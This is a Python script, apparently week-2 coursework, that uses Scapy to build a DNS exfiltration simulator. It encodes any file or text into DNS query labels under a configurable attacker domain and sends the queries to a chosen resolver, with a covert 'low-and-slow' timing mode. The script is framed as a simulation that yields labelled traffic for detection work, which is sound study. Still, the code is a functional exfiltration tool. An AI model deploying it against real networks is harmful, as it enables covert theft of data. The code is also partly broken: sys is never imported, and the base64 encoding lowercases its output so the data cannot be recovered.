"""
Week 2: Scapy DNS Exfiltration Simulation Engine
================================================
Engine to simulate DNS data exfiltration and tunneling attacks using Scapy.
Supports:
- RFC 1035 compliant DNS query label construction.
- Chunking arbitrary files and byte payloads.
- Multiple encodings: Base32 (padding-stripped), Hex, and Base64url.
- Multiple DNS record types: A (1), TXT (16), AAAA (28), CNAME (5).
- Transmission profiles: 'burst' (rapid) and 'low-and-slow' (covert).
- Scapy packet crafting and PCAP generation.
"""

import time
import base64
import random
import re
import argparse
from typing import List, Dict, Any, Optional
from pathlib import Path

try:
    from scapy.all import IP, UDP, DNS, DNSQR, send, wrpcap
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


def validate_rfc_compliance(fqdn: str) -> bool:
    """
    Validate whether an FQDN strictly satisfies RFC 1035 and RFC 2181 rules:
    1. Total length <= 253 characters (excluding terminal dot).
    2. Each label length between 1 and 63 characters.
    3. Label contains only letters [a-z, A-Z], digits [0-9], and hyphens [-].
    4. Label does not start or end with a hyphen.
    """
    cleaned = fqdn.rstrip(".")
    if not cleaned or len(cleaned) > 253:
        return False

    labels = cleaned.split(".")
    label_pattern = re.compile(r"^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?$")

    for label in labels:
        if len(label) < 1 or len(label) > 63:
            return False
        # Single-character labels cannot be a hyphen; longer labels must match pattern
        if not label_pattern.match(label):
            return False

    return True


class DNSExfiltrationSimulator:
    """Simulates DNS data exfiltration by chunking and encoding payloads into RFC-compliant query labels."""

    def __init__(
        self,
        target_domain: str = "tunnel.example.com",
        dns_server: str = "127.0.0.1",
        dns_port: int = 53,
        encoding: str = "base32",
        max_label_length: int = 63,
        delay: float = 0.05,
        jitter: float = 0.01,
    ):
        self.target_domain = target_domain.strip(".")
        self.dns_server = dns_server
        self.dns_port = dns_port
        self.encoding = encoding.lower()
        self.max_label_length = min(max(max_label_length, 10), 63)
        self.delay = delay
        self.jitter = jitter

        if not validate_rfc_compliance(self.target_domain):
            raise ValueError(f"Target domain '{target_domain}' is not RFC 1035 compliant")

    def encode_payload(self, data: bytes) -> str:
        """
        Encode raw payload bytes into DNS-safe string according to selected scheme.
        - base32: RFC 4648 Base32, lowercased, padding '=' stripped.
        - hex: Lowercase hexadecimal string.
        - base64: URL-safe Base64, padding '=' stripped, lowercased.
        """
        if self.encoding == "base32":
            # RFC 4648 Base32 (A-Z, 2-7). Strip '=' padding for RFC-compliant DNS labels.
            return base64.b32encode(data).decode("ascii").rstrip("=").lower()
        elif self.encoding == "hex":
            # Standard hex (0-9, a-f)
            return data.hex().lower()
        elif self.encoding == "base64":
            # URL-safe Base64 (replace '+' with '-', '/' with '_', strip '=')
            return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=").lower().replace("_", "-")
        else:
            raise ValueError(f"Unsupported encoding: {self.encoding}. Choose 'base32', 'hex', or 'base64'.")

    def chunk_payload(self, encoded_data: str) -> List[str]:
        """
        Chunk encoded payload into sequence-tagged labels that fit strictly
        within the 63-char label limit and the 253-char FQDN limit.
        """
        if not encoded_data:
            raise ValueError("Payload cannot be empty")

        # Estimate sequence digits needed
        # Format: sq<seq>.<chunk>.<target_domain>
        # Each query: len(target_domain) + 1 + len(seq_label) + 1 + len(chunk) <= 253
        # Max chunk label len is min(self.max_label_length, available_len)
        base_overhead = len(self.target_domain) + 1  # ".target_domain"
        seq_label_len = 8  # e.g., "sq000001"
        max_chunk_len = min(self.max_label_length, 253 - base_overhead - seq_label_len - 1)

        if max_chunk_len < 4:
            raise ValueError(f"Target domain '{self.target_domain}' leaves too few characters for payload chunking")

        raw_chunks = [encoded_data[i:i + max_chunk_len] for i in range(0, len(encoded_data), max_chunk_len)]
        total = len(raw_chunks)
        pad_width = max(4, len(str(total)))

        labeled_chunks = []
        for idx, chunk in enumerate(raw_chunks, start=1):
            seq_tag = f"sq{idx:0{pad_width}d}"
            # Ensure chunk doesn't start or end with hyphen
            clean_chunk = chunk.strip("-")
            if not clean_chunk:
                clean_chunk = "0"
            labeled_chunks.append(f"{seq_tag}.{clean_chunk}")

        return labeled_chunks

    def generate_queries(self, payload: bytes) -> List[str]:
        """
        Generate complete, RFC-compliant FQDN queries for the payload.
        Verifies RFC compliance for every generated query.
        """
        encoded = self.encode_payload(payload)
        chunks = self.chunk_payload(encoded)
        fqdns = [f"{chunk}.{self.target_domain}" for chunk in chunks]

        for q in fqdns:
            if not validate_rfc_compliance(q):
                raise ValueError(f"Generated query violates RFC 1035 rules: {q}")

        return fqdns

    def craft_packet(self, fqdn: str, qtype: str = "A"):
        """Craft a Scapy DNS query packet."""
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required to craft network packets.")

        qtype_map = {"A": 1, "AAAA": 28, "TXT": 16, "CNAME": 5}
        qtype_num = qtype_map.get(qtype.upper(), 1)

        pkt = (
            IP(dst=self.dns_server)
            / UDP(sport=random.randint(1024, 65535), dport=self.dns_port)
            / DNS(rd=1, qd=DNSQR(qname=fqdn, qtype=qtype_num))
        )
        return pkt

    def send_queries(
        self,
        queries: List[str],
        qtype: str = "A",
        save_pcap: Optional[str] = None,
        verbose: bool = True,
    ) -> List[Dict[str, Any]]:
        """
        Transmit generated queries (or craft packets and write to PCAP).
        Returns a list of query transmission metadata dictionaries.
        """
        records = []
        packets = []

        if verbose:
            print(f"[*] Transmitting {len(queries)} DNS queries via {qtype} records to {self.dns_server}:{self.dns_port}...")

        start_time = time.time()
        for i, fqdn in enumerate(queries, start=1):
            now = time.time()
            record = {
                "timestamp": now,
                "src_ip": "127.0.0.1",
                "dst_ip": self.dns_server,
                "qname": fqdn,
                "qtype": qtype.upper(),
                "chunk_index": i,
                "total_chunks": len(queries),
                "encoding": self.encoding,
                "label": 1  # Malicious / exfiltration
            }
            records.append(record)

            if SCAPY_AVAILABLE:
                pkt = self.craft_packet(fqdn, qtype=qtype)
                packets.append(pkt)
                try:
                    send(pkt, verbose=False)
                except Exception as e:
                    if verbose:
                        print(f"    [!] Error sending packet {i}: {e}")

            if verbose and (i <= 5 or i == len(queries) or i % 50 == 0):
                print(f"    [{i:4d}/{len(queries)}] Sent: {fqdn[:55]}...")

            # Jittered delay
            if self.delay > 0:
                sleep_time = max(0.001, self.delay + random.uniform(-self.jitter, self.jitter))
                time.sleep(sleep_time)

        elapsed = time.time() - start_time
        if verbose:
            print(f"[✓] Simulation completed: {len(queries)} queries transmitted in {elapsed:.2f}s ({len(queries)/max(elapsed, 0.001):.1f} q/s)")

        if save_pcap and SCAPY_AVAILABLE and packets:
            pcap_path = Path(save_pcap)
            pcap_path.parent.mkdir(parents=True, exist_ok=True)
            wrpcap(str(pcap_path), packets)
            if verbose:
                print(f"[✓] Saved {len(packets)} crafted packets to {pcap_path}")

        return records


def main():
    parser = argparse.ArgumentParser(
        description="Week 2: Scapy DNS Exfiltration Simulator (RFC-Compliant Chunking & Encoding)"
    )
    parser.add_argument("--domain", default="tunnel.example.com", help="Attacker controlled apex/tunnel domain")
    parser.add_argument("--server", default="127.0.0.1", help="Target DNS resolver IP")
    parser.add_argument("--port", type=int, default=53, help="DNS port")
    parser.add_argument("--encoding", choices=["base32", "hex", "base64"], default="base32", help="Encoding scheme")
    parser.add_argument("--type", choices=["A", "TXT", "AAAA", "CNAME"], default="TXT", help="DNS query record type")
    parser.add_argument("--text", help="Plain text string to exfiltrate")
    parser.add_argument("--file", help="Path to file to exfiltrate")
    parser.add_argument("--mode", choices=["burst", "low-and-slow"], default="burst", help="Transmission profile")
    parser.add_argument("--delay", type=float, help="Explicit delay between queries in seconds (overrides mode)")
    parser.add_argument("--pcap-out", help="Save generated packets to PCAP file")
    parser.add_argument("--dry-run", action="store_true", help="Print crafted queries without sending network packets")

    args = parser.parse_args()

    # Determine payload
    if args.file:
        file_path = Path(args.file)
        if not file_path.exists():
            print(f"[!] File not found: {args.file}")
            sys.exit(1)
        payload = file_path.read_bytes()
        print(f"[*] Loaded {len(payload)} bytes from file: {file_path.name}")
    elif args.text:
        payload = args.text.encode("utf-8")
        print(f"[*] Loaded {len(payload)} bytes from provided text string.")
    else:
        payload = b"CRITICAL_EXFIL_DATA: user=admin, secret_token=x89Fa9c01B2dE, timestamp=1710000000"
        print(f"[*] Using sample exfiltration payload ({len(payload)} bytes).")

    # Set delay based on profile
    if args.delay is not None:
        delay = args.delay
        jitter = delay * 0.1
    elif args.mode == "low-and-slow":
        delay = 2.0
        jitter = 0.5
    else:  # burst
        delay = 0.01
        jitter = 0.002

    sim = DNSExfiltrationSimulator(
        target_domain=args.domain,
        dns_server=args.server,
        dns_port=args.port,
        encoding=args.encoding,
        delay=delay,
        jitter=jitter,
    )

    queries = sim.generate_queries(payload)
    print(f"[✓] Generated {len(queries)} RFC-compliant DNS queries using '{args.encoding}' encoding.")
    print(f"[*] First query sample: {queries[0]}")
    print(f"[*] RFC 1035 validity check: {'PASSED' if validate_rfc_compliance(queries[0]) else 'FAILED'}")

    if args.dry_run:
        print("\n--- Dry Run: Crafted Queries ---")
        for i, q in enumerate(queries[:10], start=1):
            print(f"  [{i:2d}] {q}")
        if len(queries) > 10:
            print(f"  ... and {len(queries) - 10} more queries.")
    else:
        sim.send_queries(queries, qtype=args.type, save_pcap=args.pcap_out)


if __name__ == "__main__":
    main()
